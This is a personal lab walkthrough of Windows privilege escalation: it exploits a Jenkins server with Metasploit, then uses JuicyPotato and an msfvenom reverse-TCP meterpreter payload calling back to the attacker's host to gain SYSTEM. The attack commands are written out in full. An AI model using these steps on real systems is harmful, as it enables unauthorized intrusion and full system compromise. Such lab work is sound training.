# Windows Privilege Escalation

## Objective: 
Windows Privilege Escalation, leveraging tools and techniques to gain unauthorized access to system-level resources on a Windows Server machine within a controlled environment. The lab commences with gaining a limited shell via exploiting Jenkins on port 8484, followed by escalating privileges using Juicy Potato. This project provides hands-on experience in exploiting service vulnerabilities, working with Meterpreter shell, and privilege escalation techniques. The ultimate objective is to attain an NT AUTHORITY\SYSTEM level access, thereby demonstrating the vulnerabilities and the importance of securing Windows systems.

## Walkthrough:

### Part 1

- I initiated a Nmap scan within a specified IP range using the command **nmap 10.0.2.0/25**. Given that my host IP is 10.0.2.6, I deduced that the Windows VM IP is 10.0.2.8 with multiple open ports.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp1.png" alt="">
</p>

- I noticed that port 8484 wasn’t displayed as open, prompting me to check using the command **"nmap -p 8484 -sV 10.0.2.8"**. I found it open and identified the running service to be **Jetty winstone-2.8**, an HTTP service.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP2.png" alt="">
</p>

- With this information, I accessed Jenkins by entering the IP address and port number **10.0.2.8:8484** in Firefox.

  <p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp3.png" alt="">
</p>

- I then switched to the terminal and entered **MSFconsole** to search for Jenkins exploits. Following the instructions, I selected **exploit number 6**.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP4.png" alt="">
</p>

- Setting options for this exploit, I configured the username and password to **vagrant**, defined the rhost as 10.0.2.8 (target IP), set the target URI based on the Firefox URL **http://10.0.2.8:8484/**, defined the srvhost as my host IP (10.0.2.6), and assigned the rport as 8484. Executing the **run** command opened the meterpreter session 1 as NT Authority\local service.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP5.1.png" alt="">
</p>
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP5.2.png" alt="">
</p>

- I verified if the SeImpersonatePrivilege was enabled, and it was.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP6.png" alt="">
</p>

- Next, I uploaded **JuicyPotato** to the target machine using the meterpreter command **upload /home/kali/Downloads/JuicyPotato.exe**.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP7.1.png" alt="">
</p>
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/WP7.2.png" alt="">
</p>

- A quick **ls** command confirmed its presence on the machine with **rwx** permissions across all user groups.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp8.png" alt="">
</p>

### Part 2

- The task began with the creation of a 64-bit Windows meterpreter using MSFvenom. In the Kali terminal, the command **“msfvenom -l payloads | grep windows”** was issued to display a list of Windows payloads. I opted for **“windows/x64/meterpreter/reverse_tcp”**.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp9.png" alt="">
</p>
  
- To construct the payload, the command **“msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.6 LPORT=4445 -f exe > windyprivesc.exe”** was executed.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp10.png" alt="">
</p>
  
- The subsequent step was to transfer the crafted file to the target machine. Within the meterpreter environment, this was achieved using the **“upload windyprivesc.exe”** command.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp11.png" alt="">
</p>
  
- To proceed, the generic multi-handler exploit was required. After launching MSFconsole, I searched for multi handlers. I chose option 5, recognized as a generic payload handler, and configured the payload, LHOST, and LPORT accordingly.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp12.png" alt="">
</p>
  
- The core task was to run the exploit within the directory containing both JuicyPotato and the windyprivesc.exe file on the target VM. This operation was performed inside a shell in meterpreter, using the command **“C:\Program Files\jenkins\Scripts>.\JuicyPotato.exe -t * -p windyprivesc.exe -l 4445”**.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp13.png" alt="">
</p>
  
- Once redirected to the multi handler and upon gaining access to the shell, the command **“whoami /priv”** was run. The resultant display showed all enabled privileges. To conclude the assignment, I echoed my name into the terminal for verification purposes.
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Privesc/Assets/wp14.png" alt="">
</p>
